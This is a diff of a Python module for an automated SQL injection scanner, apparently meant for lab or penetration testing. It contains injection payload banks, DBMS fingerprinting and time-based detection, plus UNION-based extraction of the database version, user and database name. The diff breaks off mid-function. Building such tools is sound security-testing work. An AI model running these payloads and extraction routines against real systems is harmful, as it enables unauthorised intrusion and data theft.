@@ -1,35 +1,35 @@
-# sqli_part.py — SQL Injection phases & helpers
+# sqli_part.py — SQL Injection phases & helpers (Refactored + Verified Engine)
 
 import re
 import time
 import difflib
+import statistics
+from dataclasses import dataclass
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from copy import deepcopy
 
-# --- Default SQL payloads ---
-SQL_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", " OR 1=1--"]
 
-SQL_ERR_PATTERNS = [
-    r"you have an error in your sql syntax",
-    r"warning: mysql",
-    r"unclosed quotation mark after the character string",
-    r"syntax error.*mysql",
-    r"pg_query\(",
-]
-SQL_ERR_RE = re.compile("|".join(SQL_ERR_PATTERNS), re.IGNORECASE)
+# ============================================================
+# 0) Core Patterns + Helpers (Error detection + DBMS fingerprint)
+# ============================================================
 
-# --- DB-specific error signatures for DBMS fingerprinting ---
+# Consolidated DB error signatures (better DBMS detection)
 DB_ERROR_SIGNATURES = {
+    "sqlite": [
+        r"sqlite3\.", r"SQLiteException", r"SQL logic error", r"no such table",
+        r"near \".+?\": syntax error", r"sqlite error", r"SQLite\/JDBCDriver",
+    ],
     "mysql": [
         r"you have an error in your sql syntax",
         r"mysql server version for the right syntax",
-        r"warning: mysql_?",
+        r"warning:\s*mysql_?",
         r"mysqli?_",
-        r"pdo_mysql"
+        r"pdo_mysql",
+        r"mariaDB server version for the right syntax",  # sometimes appears in mysql-like stacks
     ],
     "mariadb": [
         r"mariadb server version for the right syntax",
-        r"mariadb"
+        r"mariadb",
     ],
     "mssql": [
         r"unclosed quotation mark after the character string",
@@ -37,37 +37,111 @@ DB_ERROR_SIGNATURES = {
         r"sql server native client",
         r"odbc sql server driver",
         r"\[sql server\]",
-        r"microsoft ole db provider for sql server"
+        r"microsoft ole db provider for sql server",
+        r"incorrect syntax near",
     ],
     "postgresql": [
         r"pg::syntaxerror",
         r"psql:\s*error",
         r"org\.postgresql",
         r"postgresql.*error",
-        r"error:\s+syntax error at or near"
+        r"error:\s+syntax error at or near",
+        r"pg_query\(",
+        r"pg_exec\(",
     ],
     "oracle": [
         r"ora-\d{5}",
         r"oracle error",
         r"oracle database",
-        r"quoted string not properly terminated"
-    ]
+        r"quoted string not properly terminated",
+    ],
 }
 
-# --- Active DB fingerprint payloads (error-provocation only) ---
+# General SQL error regex (fast check)
+_SQL_ERR_PATTERNS_FLAT = []
+for _db, _pats in DB_ERROR_SIGNATURES.items():
+    _SQL_ERR_PATTERNS_FLAT.extend(_pats)
+SQL_ERR_RE = re.compile("|".join(_SQL_ERR_PATTERNS_FLAT), re.IGNORECASE)
+
+
+def is_sql_error(text: str) -> bool:
+    return bool(text and SQL_ERR_RE.search(text))
+
+
+def detect_dbms_from_body(text: str):
+    """Best-effort DBMS detection from response body."""
+    if not text:
+        return None
+    body = text.lower()
+    # Prefer specific over generic
+    for dbms, patterns in DB_ERROR_SIGNATURES.items():
+        for p in patterns:
+            try:
+                if re.search(p, body, re.IGNORECASE):
+                    return dbms
+            except re.error:
+                continue
+    return None
+
+
+def _looks_numeric_simple(v):
+    try:
+        float(v)
+        return True
+    except Exception:
+        return False
+
+
+def _pick_db_key_from_fingerprint(fp):
+    """
+    Keeps your old behavior but supports sqlite too.
+    Expects fp dict like {"database": "..."}.
+    """
+    db = (fp or {}).get("database") or ""
+    db = (db or "").lower()
+    if "sqlite" in db:
+        return "sqlite"
+    if "mysql" in db or "maria" in db:
+        return "mysql"
+    if "postgres" in db:
+        return "postgresql"
+    if "mssql" in db or "sql server" in db:
+        return "mssql"
+    if "oracle" in db:
+        return "oracle"
+    return "generic"
+
+
+# ============================================================
+# 1) Payload banks (kept for compatibility)
+# ============================================================
+
+# Default SQL payloads (basic probes - mostly used by scanner heuristics if any)
+SQL_PAYLOADS = [
+    "'", "\"",
+    "' OR '1'='1", "\" OR \"1\"=\"1",
+    "1 OR 1=1--", "1 OR 1=1#",
+    "' OR 1=1-- ", "') OR ('1'='1",
+    "';-- ", "'; -- ",
+]
+
+# Active DB fingerprint payloads (error-provocation only)
 ACTIVE_FP_PAYLOADS = [
     "'\")))))",
     "' AND 1=CONVERT(INT,@@version)--",
     "'; SELECT pg_sleep(0); --",
-    "'||(SELECT 1/0)||'"
+    "'||(SELECT 1/0)||'",
+    "'", "\"", "')", "'))", "`", "'--", "\"--",
 ]
 
-# --- Time-based SQLi payloads ---
-TIME_SSQLI_PAYLOADS = {
+# Time-based SQLi payloads (DB keyed)
+# NOTE: sqlite doesn't have native sleep in typical setups; prefer error/boolean/union there.
+TIME_SQLI_PAYLOADS = {
     "mysql": [
         "' OR SLEEP({delay})-- -",
         "\" OR SLEEP({delay})-- -",
         "1) OR SLEEP({delay})-- -",
+        "' AND SLEEP({delay})-- -",
     ],
     "mssql": [
         "'; WAITFOR DELAY '0:0:{delay}'--",
@@ -76,13 +150,14 @@ TIME_SSQLI_PAYLOADS = {
     "postgresql": [
         "'; SELECT pg_sleep({delay});--",
         "\"; SELECT pg_sleep({delay});--",
+        "' AND (SELECT pg_sleep({delay})) IS NULL--",
     ],
     "generic": [
         "' AND IF(1=1,SLEEP({delay}),0)-- -"
     ]
 }
 
-# --- UNION expressions ---
+# UNION expressions (kept, but scanner should treat as "proof markers" in your lab)
 DB_UNION_EXPRS = {
     "mysql": {
         "version": "CONCAT('SCNVER:',@@version,':ENDSCN')",
@@ -101,31 +176,11 @@ DB_UNION_EXPRS = {
     },
 }
 
-def is_sql_error(text: str) -> bool:
-    return bool(text and SQL_ERR_RE.search(text))
-
-def _looks_numeric_simple(v):
-    try:
-        float(v)
-        return True
-    except Exception:
-        return False
-
-def _pick_db_key_from_fingerprint(fp):
-    db = (fp or {}).get("database") or ""
-    db = (db or "").lower()
-    if "mysql" in db or "maria" in db:
-        return "mysql"
-    if "postgres" in db:
-        return "postgresql"
-    if "mssql" in db or "sql server" in db:
-        return "mssql"
-    return "generic"
-
 
 # ============================================================
-# Phase 6 — SQLi Verification Engine (False Positive Filtering)
+# 2) Phase 6 — Verification Engine (stability + similarity)
 # ============================================================
+
 def _collect_attempts(send_func, normalize_response, attempts=3, sleep_between=0.0):
     results = []
     for _ in range(max(1, int(attempts))):
@@ -138,11 +193,13 @@ def _collect_attempts(send_func, normalize_response, attempts=3, sleep_between=0
             "status": getattr(r, "status_code", None),
             "length": len(norm),
             "has_sql_error": is_sql_error(raw),
+            "dbms_hint": detect_dbms_from_body(raw),
             "body_norm": norm
         })
         if sleep_between and sleep_between > 0:
             time.sleep(sleep_between)
     return results
+
 
 def _avg_pairwise_similarity(bodies):
     bodies = [b for b in bodies if b is not None]
@@ -153,6 +210,7 @@ def _avg_pairwise_similarity(bodies):
         for j in range(i + 1, len(bodies)):
             sims.append(difflib.SequenceMatcher(None, bodies[i], bodies[j]).ratio())
     return sum(sims) / len(sims) if sims else 1.0
+
 
 def _is_consistent(results, max_len_delta=50, require_same_status=True,
                    require_same_sql_error_flag=False, similarity_threshold=0.98):
@@ -179,6 +237,7 @@ def _is_consistent(results, max_len_delta=50, require_same_status=True,
 
     return True, f"consistent: status={statuses[-1]}, len≈{sum(lengths)//len(lengths)}, avg_similarity={sim:.3f}, sqlerr={errflags[-1]}"
 
+
 def verify_sqli_consistency(send_func, normalize_response, attempts=3,
                             max_len_delta=50, similarity_threshold=0.98,
                             require_same_status=True, require_same_sql_error_flag=False,
@@ -195,8 +254,9 @@ def verify_sqli_consistency(send_func, normalize_response, attempts=3,
 
 
 # ============================================================
-# Phase 6b — Time-based SQLi Verification (anti-jitter)
+# 2b) Phase 6 — Time-based SQLi Verification (anti-jitter + baseline thresholds)
 # ============================================================
+
 def _median(nums):
     nums = sorted([x for x in nums if x is not None])
     if not nums:
@@ -207,14 +267,15 @@ def _median(nums):
         return nums[mid]
     return (nums[mid - 1] + nums[mid]) / 2.0
 
+
 def _collect_timing_attempts(send_func, attempts=3, sleep_between=0.0):
     runs = []
     for _ in range(max(1, int(attempts))):
-        t0 = time.time()
+        t0 = time.perf_counter()
         r = send_func()
         if not r:
             continue
-        dt = time.time() - t0
+        dt = time.perf_counter() - t0
         runs.append({
             "time": dt,
             "status": getattr(r, "status_code", None),
@@ -224,10 +285,8 @@ def _collect_timing_attempts(send_func, attempts=3, sleep_between=0.0):
             time.sleep(sleep_between)
     return runs
 
+
 def _timing_consistent(runs, max_time_jitter=0.75, require_same_status=True):
-    """
-    max_time_jitter: absolute seconds allowed between min/max in runs
-    """
     if not runs or len(runs) < 2:
         return False, "not-enough-timing-samples"
     times = [x["time"] for x in runs]
@@ -243,17 +302,36 @@ def _timing_consistent(runs, max_time_jitter=0.75, require_same_status=True):
     med = _median(times)
     return True, f"timing-consistent: median={med:.3f}s, jitter={jitter:.3f}s, status={statuses[-1]}"
 
+
+def _dynamic_time_threshold(base_times, minimum_extra=1.6, sigma=4.0):
+    """
+    Dynamic threshold: mean + max(minimum_extra, sigma*stdev)
+    Returns extra seconds required above baseline median/mean.
+    """
+    times = [t for t in (base_times or []) if t is not None]
+    if not times:
+        return minimum_extra
+    mean = statistics.mean(times)
+    stdev = statistics.pstdev(times) if len(times) > 1 else 0.0
+    # We return a delta threshold relative to mean to compare with injected median
+    return max(minimum_extra, sigma * stdev)
+
+
 def verify_time_based_sqli(send_baseline, send_injected, attempts=3,
                            time_threshold=4.0,
                            max_baseline_jitter=0.75,
                            max_injected_jitter=1.00,
                            require_same_status=True,
-                           sleep_between=0.0):
+                           sleep_between=0.0,
+                           use_dynamic_threshold=True,
+                           dynamic_min_extra=1.6,
+                           dynamic_sigma=4.0):
     """
     Confirms time-based only if:
       - baseline timings stable
       - injected timings stable
-      - median(injected) >= median(baseline) + time_threshold
+      - median(injected) >= median(baseline) + threshold
+    threshold = max(time_threshold, dynamic(mean+sigma*stdev)) if enabled
     """
     base_runs = _collect_timing_attempts(send_baseline, attempts=attempts, sleep_between=sleep_between)
     inj_runs = _collect_timing_attempts(send_injected, attempts=attempts, sleep_between=sleep_between)
@@ -261,8 +339,11 @@ def verify_time_based_sqli(send_baseline, send_injected, attempts=3,
     base_ok, base_ev = _timing_consistent(base_runs, max_time_jitter=max_baseline_jitter, require_same_status=require_same_status)
     inj_ok, inj_ev = _timing_consistent(inj_runs, max_time_jitter=max_injected_jitter, require_same_status=require_same_status)
 
-    base_med = _median([x["time"] for x in base_runs]) if base_runs else None
-    inj_med = _median([x["time"] for x in inj_runs]) if inj_runs else None
+    base_times = [x["time"] for x in base_runs]
+    inj_times = [x["time"] for x in inj_runs]
+
+    base_med = _median(base_times) if base_runs else None
+    inj_med = _median(inj_times) if inj_runs else None
 
     if not base_ok or not inj_ok or base_med is None or inj_med is None:
         return {
@@ -272,23 +353,30 @@ def verify_time_based_sqli(send_baseline, send_injected, attempts=3,
             "injected": {"runs": inj_runs, "median": inj_med, "ok": inj_ok, "evidence": inj_ev},
         }
 
-    confirmed = (inj_med >= (base_med + float(time_threshold)))
+    thr = float(time_threshold)
+    if use_dynamic_threshold:
+        dyn = _dynamic_time_threshold(base_times, minimum_extra=dynamic_min_extra, sigma=dynamic_sigma)
+        thr = max(thr, float(dyn))
+
+    confirmed = (inj_med >= (base_med + thr))
     evidence = (
         f"phase6-time: baseline[{base_ev}] injected[{inj_ev}] | "
-        f"median_delta={(inj_med - base_med):.3f}s (threshold={float(time_threshold):.3f}s)"
+        f"median_delta={(inj_med - base_med):.3f}s (threshold={thr:.3f}s)"
     )
     return {
         "verified": bool(confirmed),
         "evidence": evidence,
         "baseline": {"runs": base_runs, "median": base_med, "ok": base_ok, "evidence": base_ev},
         "injected": {"runs": inj_runs, "median": inj_med, "ok": inj_ok, "evidence": inj_ev},
-        "delta": (inj_med - base_med)
+        "delta": (inj_med - base_med),
+        "threshold_used": thr
     }
 
 
-# -------------------------
-# Active DB Fingerprinting
-# -------------------------
+# ============================================================
+# 3) Active DB Fingerprinting (kept but improved)
+# ============================================================
+
 def active_db_fingerprint(method, url, params, request_with_timeout, headers=None, verbose=False, log=print):
     evidence = []
     scores = {}
@@ -310,15 +398,23 @@ def active_db_fingerprint(method, url, params, request_with_timeout, headers=Non
             if not r:
                 continue
 
-            body = (r.text or "").lower()
-            for dbms, patterns in DB_ERROR_SIGNATURES.items():
+            body_raw = (r.text or "")
+            body = body_raw.lower()
+
+            dbms = detect_dbms_from_body(body_raw)
+            if dbms:
+                scores[dbms] = scores.get(dbms, 0) + 2
+                evidence.append(f"active-fp: param={pname}, payload={pl!r}, matched-dbms={dbms}")
+                continue
+
+            # fallback: check all patterns (light)
+            for dbms_k, patterns in DB_ERROR_SIGNATURES.items():
                 for p in patterns:
                     try:
-                        if re.search(p, body):
-                            scores[dbms] = scores.get(dbms, 0) + 1
-                            evidence.append(
-                                f"active-fp: param={pname}, payload={pl!r}, url={test_url}, matched /{p}/ for {dbms}"
-                            )
+                        if re.search(p, body, re.IGNORECASE):
+                            scores[dbms_k] = scores.get(dbms_k, 0) + 1
+                            evidence.append(f"active-fp: param={pname}, payload={pl!r}, matched /{p}/ for {dbms_k}")
+                            break
                     except re.error:
                         continue
 
@@ -333,9 +429,10 @@ def active_db_fingerprint(method, url, params, request_with_timeout, headers=Non
     return best_db, evidence
 
 
-# -------------------------
-# Phase 1: Boolean Blind SQLi
-# -------------------------
+# ============================================================
+# 4) Phase 1: Boolean Blind SQLi (Upgraded verification logic inside)
+# ============================================================
+
 class BlindBooleanSQLiPhase:
     def __init__(self, request_with_timeout, normalize_response, now_ts, compute_score, log=print,
                  retries=3, length_diff_ratio=0.15, similarity_threshold=0.97):
@@ -353,30 +450,30 @@ class BlindBooleanSQLiPhase:
         lengths = []
         bodies = []
         statuses = []
+        sqlerrs = []
         for _ in range(self.retries):
             r = self.request_with_timeout(method, url, headers=headers)
             if not r:
                 continue
-            body = self.normalize_response(r.text or "")
+            raw = r.text or ""
+            body = self.normalize_response(raw) if self.normalize_response else raw
             lengths.append(len(body))
             bodies.append(body)
             statuses.append(r.status_code)
+            sqlerrs.append(is_sql_error(raw))
         if not lengths:
-            return None, None, None
+            return None, None, None, None
         avg_len = sum(lengths) / len(lengths)
-        return avg_len, bodies[-1], statuses[-1]
+        return avg_len, bodies[-1], statuses[-1], sqlerrs[-1]
 
     def _looks_numeric(self, value):
-        try:
-            float(value)
-            return True
-        except Exception:
-            return False
+        return _looks_numeric_simple(value)
 
     def _build_injected_value(self, original_value, which):
         original_value = "" if original_value is None else original_value
         if self._looks_numeric(original_value):
             return f"{original_value} AND 1=1" if which == "true" else f"{original_value} AND 1=2"
+        # string
         return f"{original_value}' AND '1'='1" if which == "true" else f"{original_value}' AND '1'='2"
 
     def _similar(self, a, b):
@@ -404,7 +501,7 @@ class BlindBooleanSQLiPhase:
         if not params:
             return []
 
-        base_len, base_body, _base_status = self._send_retriable(method, url, headers=headers)
+        base_len, base_body, base_status, base_sqlerr = self._send_retriable(method, url, headers=headers)
         if base_body is None:
             return []
 
@@ -422,8 +519,8 @@ class BlindBooleanSQLiPhase:
             false_qs = urlencode({k: v[0] for k, v in false_params.items()}, doseq=False)
             false_url = urlunparse(parsed._replace(query=false_qs))
 
-            true_len, true_body, _true_status = self._send_retriable(method, true_url, headers=headers)
-            false_len, false_body, false_status = self._send_retriable(method, false_url, headers=headers)
+            true_len, true_body, true_status, true_sqlerr = self._send_retriable(method, true_url, headers=headers)
+            false_len, false_body, false_status, false_sqlerr = self._send_retriable(method, false_url, headers=headers)
 
             if true_body is None or false_body is None:
                 continue
@@ -432,13 +529,19 @@ class BlindBooleanSQLiPhase:
             sim_base_false = self._similar(base_body, false_body)
             sim_true_false = self._similar(true_body, false_body)
 
-            is_true_like_base = (sim_base_true >= self.similarity_threshold and
-                                 not self._significant_length_diff(base_len, true_len))
+            is_true_like_base = (
+                sim_base_true >= self.similarity_threshold and
+                not self._significant_length_diff(base_len, true_len) and
+                (true_status == base_status)
+            )
 
+            # False must differ meaningfully (body OR len OR status OR sql-error flag)
             is_false_differs = (
                 sim_base_false < self.similarity_threshold or
                 self._significant_length_diff(base_len, false_len) or
-                sim_true_false < self.similarity_threshold or
+                (false_status != base_status) or
+                (true_sqlerr != false_sqlerr) or
+                (sim_true_false < self.similarity_threshold) or
                 self._significant_length_diff(true_len, false_len)
             )
 
@@ -452,16 +555,17 @@ class BlindBooleanSQLiPhase:
                     "injected_param": param_name,
                     "payload": "[BOOLEAN_PROBE: AND 1=1 / AND 1=2]",
                     "vuln_type": "Potential Blind SQLi",
-                    "phase": "blind",  # <-- Phase 7 classification hook
+                    "phase": "blind",
                     "reason": (
-                        "Boolean-based difference: baseline≈true (AND 1=1) but baseline/false (AND 1=2) responses differ. "
-                        f"sim_base_true={sim_base_true:.3f}, sim_base_false={sim_base_false:.3f}, sim_true_false={sim_true_false:.3f}"
+                        "Boolean-based difference: baseline≈true but baseline/false differ. "
+                        f"sim_base_true={sim_base_true:.3f}, sim_base_false={sim_base_false:.3f}, sim_true_false={sim_true_false:.3f}, "
+                        f"status(base/false)={base_status}/{false_status}, sqlerr(base/false)={base_sqlerr}/{false_sqlerr}"
                     ),
                     "status_code": false_status,
                     "auto_verified": False,
                     "verify": {
                         "verified": False,
-                        "evidence": "Phase 1 boolean heuristic only",
+                        "evidence": "Phase 1 boolean upgraded heuristic (needs auto_verify_sqli for confirmed)",
                         "score_delta": 0,
                         "elapsed": 0.0
                     },
@@ -477,19 +581,20 @@ class BlindBooleanSQLiPhase:
         return findings
 
 
-# -------------------------
-# Phase 2: Time-based SQLi (Upgraded with Phase 6 verification)
-# -------------------------
+# ============================================================
+# 5) Phase 2: Time-based SQLi (Verified + Baseline thresholds)
+# ============================================================
+
 def measure_avg_response_time(method, url, request_with_timeout, headers=None, data=None, json_body=None, samples=3):
     times = []
     last_status = None
     last_len = 0
     for _ in range(max(1, samples)):
-        t0 = time.time()
+        t0 = time.perf_counter()
         r = request_with_timeout(method, url, headers=headers, data=data, json_body=json_body)
         if not r:
             continue
-        dt = time.time() - t0
+        dt = time.perf_counter() - t0
         times.append(dt)
         last_status = r.status_code
         last_len = len(r.text or "")
@@ -497,6 +602,7 @@ def measure_avg_response_time(method, url, request_with_timeout, headers=None, d
         return None, None, None
     avg = sum(times) / len(times)
     return avg, last_status, last_len
+
 
 def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data,
                               fingerprint, time_delay, time_threshold, time_samples,
@@ -507,7 +613,7 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
         return findings
 
     db_key = _pick_db_key_from_fingerprint(fingerprint)
-    payload_templates = TIME_SSQLI_PAYLOADS.get(db_key, TIME_SSQLI_PAYLOADS["generic"])
+    payload_templates = TIME_SQLI_PAYLOADS.get(db_key, TIME_SQLI_PAYLOADS.get("generic", []))
 
     def _send_baseline():
         return request_with_timeout(
@@ -528,16 +634,17 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
         return findings
 
     if verbose:
-        log(f"[TIME] Baseline avg for {url}: {baseline_avg:.3f}s (samples={time_samples})")
+        log(f"[TIME] Baseline avg for {url}: {baseline_avg:.3f}s (samples={time_samples}) | db_key={db_key}")
 
     parsed = urlparse(url)
 
     for param_name, values in params.items():
         original_value = values[0] if values else ""
+
         for tmpl in payload_templates:
             payload_str = tmpl.format(delay=time_delay)
-
             injected_value = f"{original_value}{payload_str}"
+
             new_params = deepcopy(params)
             new_params[param_name] = [injected_value]
             query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
@@ -551,6 +658,7 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
                     json_body=json_body if method == "POST" and json_body is not None else None
                 )
 
+            # VERIFIED time-based using dynamic threshold + control stability
             v = verify_time_based_sqli(
                 send_baseline=_send_baseline,
                 send_injected=_send_injected,
@@ -559,23 +667,27 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
                 max_baseline_jitter=max(0.75, float(time_threshold) / 3.0),
                 max_injected_jitter=max(1.00, float(time_threshold) / 2.0),
                 require_same_status=True,
-                sleep_between=0.0
+                sleep_between=0.0,
+                use_dynamic_threshold=True,
+                dynamic_min_extra=1.6,
+                dynamic_sigma=4.0
             )
 
             if verbose:
                 bmed = v.get("baseline", {}).get("median")
                 imed = v.get("injected", {}).get("median")
-                log(f"[TIME] Param '{param_name}' payload '{payload_str}': baseline_med={bmed}, inj_med={imed}, verified={v.get('verified')}")
+                log(f"[TIME] Param '{param_name}' tmpl='{tmpl}': baseline_med={bmed}, inj_med={imed}, verified={v.get('verified')} thr={v.get('threshold_used')}")
 
             if not v.get("verified"):
                 continue
 
             baseline_med = v["baseline"]["median"]
             injected_med = v["injected"]["median"]
+            thr_used = v.get("threshold_used", time_threshold)
 
             verify_result = {
                 "verified": True,
-                "evidence": v.get("evidence", "") + f" | baseline_med≈{baseline_med:.2f}s, injected_med≈{injected_med:.2f}s",
+                "evidence": v.get("evidence", "") + f" | baseline_med≈{baseline_med:.2f}s, injected_med≈{injected_med:.2f}s, thr_used≈{thr_used:.2f}s",
                 "score_delta": 55,
                 "elapsed": injected_med
             }
@@ -591,8 +703,8 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
                 "injected_param": param_name,
                 "payload": payload_str,
                 "vuln_type": "Time-based SQLi",
-                "phase": "time",  # <-- Phase 7 classification hook
-                "reason": f"median response time increased from {baseline_med:.2f}s to {injected_med:.2f}s (threshold {time_threshold:.2f}s)",
+                "phase": "time",
+                "reason": f"median response time increased from {baseline_med:.2f}s to {injected_med:.2f}s (threshold {thr_used:.2f}s)",
                 "status_code": v["injected"]["runs"][-1]["status"] if v.get("injected", {}).get("runs") else None,
                 "auto_verified": True,
                 "verify": verify_result,
@@ -606,7 +718,8 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
                     "injected_runs": v["injected"]["runs"],
                     "baseline_median": baseline_med,
                     "injected_median": injected_med,
-                    "delta": v.get("delta")
+                    "delta": v.get("delta"),
+                    "threshold_used": thr_used
                 }
             }
             log(f"[VULN] Time-based SQLi on {url} param '{param_name}' payload: {payload_str} (score={score})")
@@ -616,20 +729,23 @@ def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data
     return findings
 
 
-# -------------------------
-# UNION Extraction (Phase 3b)
-# -------------------------
+# ============================================================
+# 6) UNION Extraction (Phase 3b) — keep but safer verification
+# ============================================================
+
 def _build_order_by_value(original_value, n):
     original_value = original_value or ""
     if _looks_numeric_simple(original_value):
         return f"{original_value} ORDER BY {n}-- "
     return f"{original_value}' ORDER BY {n}-- -"
 
+
 def _build_union_value(original_value, select_list):
     original_value = original_value or ""
     if _looks_numeric_simple(original_value):
         return f"{original_value} UNION ALL SELECT {select_list}-- "
     return f"{original_value}' UNION ALL SELECT {select_list}-- -"
+
 
 def _make_param_url(base_url, params, param_name, injected_value):
     parsed = urlparse(base_url)
@@ -638,9 +754,10 @@ def _make_param_url(base_url, params, param_name, injected_value):
     query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
     return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
 
+
 def _detect_column_count_order_by(method, url, params, param_name, headers, base_status, base_text_raw,
                                   request_with_timeout, normalize_response, length_change_ratio,
-                                  max_cols=8, verbose=False, log=print):
+                                  max_cols=12, verbose=False, log=print):
     base_norm = normalize_response(base_text_raw or "")
     for n in range(1, max_cols + 1):
         inj_val = _build_order_by_value(params.get(param_name, ["1"])[0], n)
@@ -648,11 +765,14 @@ def _detect_column_count_order_by(method, url, params, param_name, headers, base
         r = request_with_timeout("GET", test_url, headers=headers)
         if not r:
             if verbose:
-                log(f"[UNION] ORDER BY {n} failed for {test_url}")
+                log(f"[UNION] ORDER BY {n} request failed: {test_url}")
             break
+
         text = r.text or ""
         norm = normalize_response(text)
         len_ratio = length_change_ratio(base_norm, norm)
+
+        # If it triggers server error / SQL error / large delta => likely exceeded col count
         if r.status_code != base_status or len_ratio > 0.40 or is_sql_error(text):
             if n == 1:
                 return None
@@ -661,25 +781,37 @@ def _detect_column_count_order_by(method, url, params, param_name, headers, base
             return n - 1
     return None
 
+
 def _test_union_compatible(url, params, param_name, headers, base_status, base_text_raw,
                            col_count, request_with_timeout, normalize_response, length_change_ratio,
                            verbose=False, log=print):
+    # Use NULLs only to avoid side effects.
     nulls = ",".join(["NULL"] * col_count)
     original_value = params.get(param_name, ["1"])[0]
     inj_val = _build_union_value(original_value, nulls)
     test_url = _make_param_url(url, params, param_name, inj_val)
+
     r = request_with_timeout("GET", test_url, headers=headers)
     if not r:
         return False
+
     text = r.text or ""
     norm = normalize_response(text)
     base_norm = normalize_response(base_text_raw or "")
     len_ratio = length_change_ratio(base_norm, norm)
+
     if verbose:
-        log(f"[UNION] UNION NULLs test: status={r.status_code}, len_ratio={len_ratio:.2f}")
+        log(f"[UNION] UNION NULLs test: status={r.status_code}, len_ratio={len_ratio:.2f}, sqlerr={is_sql_error(text)}")
+
     if r.status_code >= 500 or is_sql_error(text):
         return False
+
+    # Basic "compatibility": not huge deviation
+    if len_ratio > 0.70:
+        return False
+
     return True
+
 
 def _find_reflected_columns_union(url, params, param_name, headers, col_count,
                                  request_with_timeout, verbose=False, log=print):
@@ -698,8 +830,10 @@ def _find_reflected_columns_union(url, params, param_name, headers, col_count,
         log(f"[UNION] Reflected columns: {reflected}")
     return reflected
 
+
 def _build_union_select_expr(expr, col_count, reflected_idx):
     return ",".join([expr if i == reflected_idx else "NULL" for i in range(1, col_count + 1)])
+
 
 def _extract_marker_from_body(body, marker_prefix):
     if not body:
@@ -707,6 +841,7 @@ def _extract_marker_from_body(body, marker_prefix):
     pattern = re.escape(marker_prefix) + r"(.*?)" + re.escape(":ENDSCN")
     m = re.search(pattern, body, re.DOTALL | re.IGNORECASE)
     return m.group(1).strip() if m else None
+
 
 def run_union_extraction_phase(method, url, params, headers, fingerprint,
                                base_status, base_text_raw,
@@ -718,8 +853,11 @@ def run_union_extraction_phase(method, url, params, headers, fingerprint,
         return findings
 
     db_key = _pick_db_key_from_fingerprint(fingerprint)
-    union_exprs = DB_UNION_EXPRS.get(db_key) or DB_UNION_EXPRS.get("mysql")
-    if db_key not in DB_UNION_EXPRS:
+    union_exprs = DB_UNION_EXPRS.get(db_key)
+
+    # If unknown, default to mysql markers (lab-only usage)
+    if not union_exprs:
+        union_exprs = DB_UNION_EXPRS.get("mysql")
         db_key = "mysql"
 
     for param_name, values in params.items():
@@ -729,7 +867,7 @@ def run_union_extraction_phase(method, url, params, headers, fingerprint,
         col_count = _detect_column_count_order_by(
             method, url, params, param_name, headers, base_status, base_text_raw,
             request_with_timeout, normalize_response, length_change_ratio,
-            max_cols=8, verbose=verbose, log=log
+            max_cols=12, verbose=verbose, log=log
         )
         if not col_count or col_count < 1:
             continue
@@ -755,6 +893,7 @@ def run_union_extraction_phase(method, url, params, headers, fingerprint,
         last_status = base_status
         last_test_url = url
 
+        # Extract markers (this is your lab; keep markers for proof)
         for tag, marker_prefix in [("version", "SCNVER:"), ("user", "SCNUSER:"), ("db", "SCNDB:")]:
             expr = union_exprs.get(tag)
             if not expr:
@@ -801,7 +940,7 @@ def run_union_extraction_phase(method, url, params, headers, fingerprint,
             "injected_param": param_name,
             "payload": "[UNION_EXTRACT]",
             "vuln_type": "SQLi-UNION",
-            "phase": "union",  # <-- Phase 7 classification hook
+            "phase": "union",
             "reason": (
                 f"UNION-based SQLi confirmed; cols={col_count}, reflected={reflected_cols}, "
                 f"version={db_info['db_version']}, user={db_info['current_user']}, db={db_info['current_database']}"
@@ -823,9 +962,26 @@ def run_union_extraction_phase(method, url, params, headers, fingerprint,
     return findings
 
 
-# -------------------------
-# Auto-verify SQLi (Upgraded with Phase 6)
-# -------------------------
+# ============================================================
+# 7) Auto-verify SQLi (Boolean verified; improved, less heuristic)
+# ============================================================
+
+def _build_true_false_payloads(original_value: str):
+    """
+    Build payloads using original_value context (numeric vs string).
+    Safer than fixed "1' OR..." for all cases.
+    """
+    ov = "" if original_value is None else str(original_value)
+
+    if _looks_numeric_simple(ov):
+        # numeric context
+        return (f"{ov} AND 1=1", f"{ov} AND 1=2")
+
+    # string context
+    # Try to preserve string closing with quote
+    return (f"{ov}' AND '1'='1", f"{ov}' AND '1'='2")
+
+
 def auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
                      request_with_timeout, normalize_response, base_text="",
                      json_body=None, json_key=None,
@@ -834,46 +990,54 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
                      similarity_threshold=0.98,
                      sleep_between=0.0,
                      return_details=False):
-    true_p = "1' OR '1'='1"
-    false_p = "1' AND '1'='2"
-
+    """
+    Verified boolean-based check:
+      - Ensure true response stable
+      - Ensure false response stable
+      - Confirm true and false differ (status/length/similarity/sqlerr)
+    """
     method_u = (method or "GET").upper()
 
-    def _send_true():
+    # resolve original value
+    original_value = ""
+    if json_body is not None and json_key is not None:
+        original_value = str(json_body.get(json_key, ""))
+    else:
+        if original_params and param_name in original_params:
+            vv = original_params.get(param_name) or [""]
+            original_value = vv[0] if vv else ""
+        elif post_data and param_name in post_data:
+            original_value = str(post_data.get(param_name, ""))
+        else:
+            original_value = ""
+
+    true_p, false_p = _build_true_false_payloads(original_value)
+
+    def _send_with_value(v):
         if json_body is not None and json_key is not None:
-            jb_true = deepcopy(json_body); jb_true[json_key] = true_p
-            return request_with_timeout(method_u, url, headers=headers, json_body=jb_true)
+            jb = deepcopy(json_body)
+            jb[json_key] = v
+            return request_with_timeout(method_u, url, headers=headers, json_body=jb)
 
         parsed = urlparse(url)
-        p_true = deepcopy(original_params) if original_params else {}
+        p_new = deepcopy(original_params) if original_params else {}
         key = param_name if param_name is not None else "_scantest"
-        p_true[key] = [true_p]
